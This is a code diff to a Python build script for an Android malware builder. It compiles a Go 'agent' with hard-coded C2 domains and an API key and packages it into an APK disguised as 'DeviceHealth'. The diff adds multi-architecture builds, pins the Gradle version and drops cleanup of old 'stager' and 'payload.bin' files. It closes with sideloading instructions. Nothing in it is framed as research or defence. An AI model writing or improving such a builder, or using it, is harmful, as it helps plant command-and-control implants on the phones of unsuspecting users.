@@ -243,7 +243,9 @@ def _find_gradle_cmd():
     system_gradle = shutil.which("gradle")
     if system_gradle:
         log("gradlew not found, generating wrapper with system Gradle...", "WARN")
-        run(f'"{system_gradle}" wrapper', cwd=ANDROID_DIR, check=False)
+        # Use --gradle-version 8.5 to match AGP 8.2.0 compatibility
+        # Without this, system Gradle overwrites gradle-wrapper.properties with its own version
+        run(f'"{system_gradle}" wrapper --gradle-version 8.5', cwd=ANDROID_DIR, check=False)
         if os.path.exists(wrapper):
             if not IS_WIN:
                 os.chmod(wrapper, 0o755)
@@ -381,23 +383,9 @@ def sign_apk(apk_path, output_path):
 # ============================================================
 
 def cleanup(tmpdir):
-    """Remove temp files and jniLibs."""
+    """Remove temp build directory."""
     if tmpdir and os.path.exists(tmpdir):
         shutil.rmtree(tmpdir, ignore_errors=True)
-
-    jniLibs = os.path.join(ANDROID_DIR, "app", "src", "main", "jniLibs")
-    if os.path.isdir(jniLibs):
-        shutil.rmtree(jniLibs, ignore_errors=True)
-
-    # Also clean stager dir if it exists from old builds
-    stager_dir = os.path.join(ANDROID_DIR, "stager")
-    if os.path.isdir(stager_dir):
-        shutil.rmtree(stager_dir, ignore_errors=True)
-
-    # Clean assets payload from old builds
-    assets_payload = os.path.join(ANDROID_DIR, "app", "src", "main", "assets", "payload.bin")
-    if os.path.exists(assets_payload):
-        os.remove(assets_payload)
 
 
 # ============================================================
@@ -409,8 +397,8 @@ def main():
     parser.add_argument("--domain", help="Primary Supabase domain")
     parser.add_argument("--domain2", help="Secondary Supabase domain")
     parser.add_argument("--apikey", help="Supabase API key")
-    parser.add_argument("--arch", default="arm64", choices=["arm64", "arm", "x86_64", "x86"],
-                        help="Target architecture (default: arm64)")
+    parser.add_argument("--arch", default="arm64,arm",
+                        help="Target architectures, comma-separated (default: arm64,arm). Options: arm64, arm, x86_64, x86")
     parser.add_argument("--output", default="DeviceHealth.apk", help="Output APK filename")
     args = parser.parse_args()
 
@@ -435,10 +423,18 @@ def main():
         log("  .env keys: VITE_SUPABASE_URL, VITE_SUPABASE_PUBLISHABLE_KEY", "ERR")
         sys.exit(1)
 
+    # Parse arch list
+    archs = [a.strip() for a in args.arch.split(",")]
+    valid_archs = {"arm64", "arm", "x86_64", "x86"}
+    for a in archs:
+        if a not in valid_archs:
+            log(f"Invalid architecture: {a}. Valid: {', '.join(valid_archs)}", "ERR")
+            sys.exit(1)
+
     log(f"C2 Domain: {domain1}")
     if domain2:
         log(f"C2 Domain 2: {domain2}")
-    log(f"Target arch: {args.arch}")
+    log(f"Target arch(s): {', '.join(archs)}")
 
     # Check prerequisites
     if not shutil.which("go"):
@@ -459,17 +455,20 @@ def main():
         log("  Windows (winget): winget install Gradle.Gradle", "ERR")
         sys.exit(1)
 
-    tmpdir = None
+    tmpdirs = []
     try:
-        # Stage 1: Compile
+        # Stage 1: Compile Go Agent for each architecture
         print()
         log("--- Stage 1: Compile Go Agent ---")
-        binary_path, tmpdir = compile_agent(domain1, domain2, apikey, args.arch)
+        for arch in archs:
+            binary_path, tmpdir = compile_agent(domain1, domain2, apikey, arch)
+            tmpdirs.append(tmpdir)
+            package_agent_into_apk(binary_path, arch)
+            log(f"Packaged for {arch}", "OK")
 
-        # Stage 2: Package into APK
+        # Stage 2: Build APK (contains all architectures)
         print()
-        log("--- Stage 2: Package APK ---")
-        package_agent_into_apk(binary_path, args.arch)
+        log("--- Stage 2: Build APK ---")
         apk_path = build_apk()
 
         # Stage 3: Sign
@@ -480,14 +479,26 @@ def main():
 
     finally:
         # Cleanup
-        cleanup(tmpdir)
+        for td in tmpdirs:
+            cleanup(td)
+        # Clean jniLibs
+        jniLibs = os.path.join(ANDROID_DIR, "app", "src", "main", "jniLibs")
+        if os.path.isdir(jniLibs):
+            shutil.rmtree(jniLibs, ignore_errors=True)
 
     print()
     log("Build complete!", "OK")
     log(f"Output: {args.output}", "OK")
+    log(f"Architectures: {', '.join(archs)}", "OK")
+    log(f"Min Android version: 6.0 (Marshmallow)", "OK")
     print()
     print(f"  Install: adb install {args.output}")
     print(f"  Or transfer {args.output} to device and install")
+    print()
+    print("  If 'App not installed' — check:")
+    print("    1. 'Install unknown apps' is enabled for your file manager")
+    print("    2. No previous version installed with a different signature")
+    print("       (uninstall first: adb uninstall com.devicehealth.service)")
     print()
 
 
